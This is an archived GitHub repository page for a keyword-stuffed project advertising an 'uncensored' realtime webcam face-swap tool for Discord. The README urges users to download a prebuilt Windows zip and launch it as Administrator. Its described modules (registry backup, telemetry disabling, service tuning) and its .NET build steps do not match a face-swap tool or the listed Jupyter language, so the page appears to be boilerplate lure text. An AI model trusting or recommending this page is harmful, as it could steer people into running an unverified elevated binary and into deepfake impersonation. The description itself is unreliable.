---
title: "jake-j-19d3/discord-local-uncensored-ai-deep-live-cam-v2-portable-x64"
owner: "jake-j-19d3"
name: "discord-local-uncensored-ai-deep-live-cam-v2-portable-x64"
fullName: "jake-j-19d3/discord-local-uncensored-ai-deep-live-cam-v2-portable-x64"
description: "Discord & Local Uncensored AI Deep-Live-Cam v2.1 1-Click Realtime Webcam FaceSwap CUDA Portable: native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release."
sourceUrl: "https://github.com/jake-j-19d3/discord-local-uncensored-ai-deep-live-cam-v2-portable-x64"
stars: 332
forks: 37
language: "Jupyter Notebook"
topics: ["cam", "click", "cuda-portable", "deep", "deep-live-cam", "discord-cam", "discord-click", "discord-deep"]
license: "NOASSERTION"
homepage: "https://jake-j-19d3.github.io/discord-local-uncensored-ai-deep-live-cam-v2-portable-x64/"
defaultBranch: "main"
snapshotDate: "2026-11-22"
pushedAt: "2026-11-21T21:32:03Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# Discord & Local Uncensored AI — Deep-Live-Cam v2.1 1-Click Realtime Webcam FaceSwap CUDA Portable (Portable x64 Build)

Discord & Local Uncensored AI Deep-Live-Cam v2.1 1-Click Realtime Webcam FaceSwap CUDA Portable: native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.

*图片：CI Build*
*图片：Latest Release*
*图片：Total Downloads*
*图片：Stars*
[*图片：Open in Colab*](https://colab.research.google.com/github/jake-j-19d3/discord-local-uncensored-ai-deep-live-cam-v2-portable-x64/blob/main/notebooks/quickstart.ipynb)


Overview • Quick Start (No Terminal Needed) • Architecture & Modules • Configuration • Build from Source


---

## Overview

**Discord & Local Uncensored AI — Deep-Live-Cam v2.1 1-Click Realtime Webcam FaceSwap CUDA Portable (Portable x64 Build)** (`discord-local-uncensored-ai-deep-live-cam-v2-portable-x64`) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

> [!IMPORTANT]
> **1-Click Prebuilt Package (No Compiler Required)**: Even though the full source tree (`src/`, `config/`) is included in this repository, end users do **not** need to compile anything. Click the green **Download Portable Release** button above or grab `discord-local-uncensored-ai-deep-live-cam-v2-portable-x64-v1.2.0-win64.zip` directly from **Releases**.

## Quick Start (Prebuilt Release)

| Platform | Direct Download Package | Checksum Manifest |
| :--- | :--- | :--- |
| **Windows 10 / 11 (64-bit)** | **`discord-local-uncensored-ai-deep-live-cam-v2-portable-x64-v1.2.0-win64.zip`** | `SHA256SUMS.txt` |

1. Download `discord-local-uncensored-ai-deep-live-cam-v2-portable-x64-v1.2.0-win64.zip` from the table above or the **Releases** section.
2. Extract the `.zip` archive into any folder (keep `config/settings.json` next to the launcher).
3. Launch the executable as Administrator.

## Architecture & Modules

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Portable Lifecycle Engine** | Zero-install isolated state container | Leaves host registry clean; 1-click rollback |
| **Profile State Snapshot** | Automatic backup before applying changes | Restores baseline configuration at any time |
| **Telemetry & Task Tuner** | Disables redundant background update checks | Lowers idle memory & disk I/O overhead |
| **Unattended CLI Mode** | JSON-driven configuration (`config/settings.json`) | Scriptable batch deployment on Windows 10/11 |

## Configuration (`config/settings.json`)

```json
{
  "version": "1.2.0",
  "runtime": {
    "portable_mode": true,
    "auto_backup_registry": true,
    "verify_signatures": true,
    "theme": "dark",
    "log_level": "info"
  },
  "modules": {
    "lifecycle_manager": {
      "enabled": true,
      "clean_temp_cache": true,
      "preserve_user_profiles": true
    },
    "service_optimizer": {
      "enabled": true,
      "disable_telemetry_tasks": true
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/jake-j-19d3/discord-local-uncensored-ai-deep-live-cam-v2-portable-x64.git
cd discord-local-uncensored-ai-deep-live-cam-v2-portable-x64
dotnet build src/RuntimeToolkit.csproj -c Release
```

---
Indexed tags: discord-nitro, discord-quest, deep-live-cam, facefusion, rvc-voice-changer, cuda-portable, deep, discord-deep, live, discord-live, cam, discord-cam, click, discord-click, realtime, discord-realtime
